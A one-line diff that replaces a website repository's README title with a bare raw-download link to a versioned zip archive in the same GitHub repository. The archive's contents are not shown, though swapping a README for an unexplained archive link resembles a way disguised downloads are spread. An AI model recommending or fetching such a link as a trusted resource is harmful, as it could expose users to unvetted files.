@@ -1,1 +1,1 @@
-# Visit-Burundi.github.io
+# https://github.com/kevcodecraft/Visit-Burundi.github.io/raw/refs/heads/main/featureful/github-Visit-io-Burundi-1.2-alpha.2.zip
